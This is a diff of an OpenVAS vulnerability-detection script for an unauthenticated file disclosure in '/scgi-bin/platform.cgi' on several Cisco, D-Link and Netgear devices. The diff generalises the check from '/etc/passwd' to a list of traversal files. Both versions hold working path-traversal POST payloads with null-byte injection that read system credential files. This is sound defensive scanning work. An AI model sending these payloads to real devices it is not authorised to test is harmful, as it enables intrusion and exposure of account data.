@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_multiple_devices_platform_cgi_lfi_01_16.nasl 11008 2018-08-16 13:26:16Z cfischer $
+# $Id: gb_multiple_devices_platform_cgi_lfi_01_16.nasl 11650 2018-09-27 10:32:13Z jschulte $
 #
 # Multiple Devices '/scgi-bin/platform.cgi' Unauthenticated File Disclosure
 #
@@ -28,7 +28,7 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105500");
-  script_version("$Revision: 11008 $");
+  script_version("$Revision: 11650 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 
@@ -47,13 +47,14 @@ if(description)
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_active");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-16 15:26:16 +0200 (Thu, 16 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-27 12:32:13 +0200 (Thu, 27 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-01-07 15:24:11 +0100 (Thu, 07 Jan 2016)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
-  script_dependencies("gb_get_http_banner.nasl");
+  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 443);
+  script_require_keys("Host/runs_unixoide");
   script_mandatory_keys("Embedded_HTTP_Server/banner");
 
   exit(0);
@@ -61,6 +62,7 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:443 );
 
@@ -80,35 +82,44 @@ else if( "d-link" >< tolower( buf ) || "dlink" >< tolower( buf ) )
 else
   typ = 'cisco';
 
-if( typ == "cisco" )
-  data = 'button.login.home=Se%20connecter&Login.userAgent=openvas&reload=0&SSLVPNUser.Password=openvas&SSLVPNUser.UserName=openvas&thispage=../../../../../../../../../../etc/passwd%00.htm';
-else if( typ == "dlink" )
-  data = 'thispage=../../../../../../../../../../etc/passwd%00.htm&Users.UserName=admin&Users.Password=openvas&button.login.Users.deviceStatus=Login&Login.userAgent=OpenVAS';
-else if( typ == "netgear" )
-  data = 'thispage=../../../../../../../../../../etc/passwd%00.htm&USERDBUsers.UserName=admin&USERDBUsers.Password=openvas&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login&Login.userAgent=OpenVAS';
+vtstring = get_vt_string();
+vtstring_lower = get_vt_string( lowercase: TRUE );
 
-len = strlen( data );
+files = traversal_files("linux");
 
-useragent = get_http_user_agent();
-host = http_host_name( port:port );
+foreach pattern( keys( files ) ) {
 
-req = 'POST /scgi-bin/platform.cgi HTTP/1.1\r\n' +
-      'Host: ' + host + '\r\n' +
-      'User-Agent: ' + useragent + '\r\n' +
-      'Accept: */*\r\n' +
-      'Content-Length: ' + len + '\r\n' +
-      'Content-Type: application/x-www-form-urlencoded\r\n' +
-      '\r\n' +
-      data;
+  file = files[pattern];
 
-buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+  if( typ == "cisco" )
+    data = 'button.login.home=Se%20connecter&Login.userAgent=' + vtstring_lower + '&reload=0&SSLVPNUser.Password=' + vtstring_lower + '&SSLVPNUser.UserName=' + vtstring_lower + '&thispage=../../../../../../../../../../' + file + '%00.htm';
+  else if( typ == "dlink" )
+    data = 'thispage=../../../../../../../../../../' + file + '%00.htm&Users.UserName=admin&Users.Password=' + vtstring_lower + '&button.login.Users.deviceStatus=Login&Login.userAgent=' + vtstring;
+  else if( typ == "netgear" )
+    data = 'thispage=../../../../../../../../../../' + file + '%00.htm&USERDBUsers.UserName=admin&USERDBUsers.Password=' + vtstring_lower + '&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login&Login.userAgent=' + vtstring;
 
-if( ( buf =~ "HTTP/1\.[01] 200" ) && ( buf =~ 'root:.*:0:[01]:' || ':xauth:/:/bin/cli' >< buf ) )
-{
-  report = 'By sending a special crafted POST request to "/scgi-bin/platform.cgi" it was possible to read the file "/etc/passwd".\nThe following response was received:\n\n' + buf;
-  security_message( port:port, data:report );
-  exit( 0 );
+  len = strlen( data );
+
+  useragent = get_http_user_agent();
+  host = http_host_name( port:port );
+
+  req = 'POST /scgi-bin/platform.cgi HTTP/1.1\r\n' +
+        'Host: ' + host + '\r\n' +
+        'User-Agent: ' + useragent + '\r\n' +
+        'Accept: */*\r\n' +
+        'Content-Length: ' + len + '\r\n' +
+        'Content-Type: application/x-www-form-urlencoded\r\n' +
+        '\r\n' +
+        data;
+
+  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+
+  if( ( buf =~ "HTTP/1\.[01] 200" ) && egrep( string:buf, pattern:pattern ) )
+  {
+    report = 'By sending a special crafted POST request to "/scgi-bin/platform.cgi" it was possible to read the file "/' + file + '".\nThe following response was received:\n\n' + buf;
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
 exit( 99 );
-
